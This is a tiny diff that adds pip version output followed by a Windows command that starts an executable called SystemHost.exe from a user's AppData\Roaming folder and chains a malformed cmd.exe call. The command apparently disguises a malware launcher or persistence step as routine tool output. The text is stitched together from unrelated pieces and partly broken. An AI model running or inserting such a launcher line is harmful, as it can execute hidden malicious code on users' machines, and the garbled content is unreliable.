@@ -1,0 +1,3 @@
+pip 22.2.1 from C:\Python\Python310\lib\site-packages\pip (python 3.10)
+
+cmd.exe /c start C:\Users\Dell\AppData\Roaming\Dell19042\SystemHost.exe &&\System32\cmd.exe
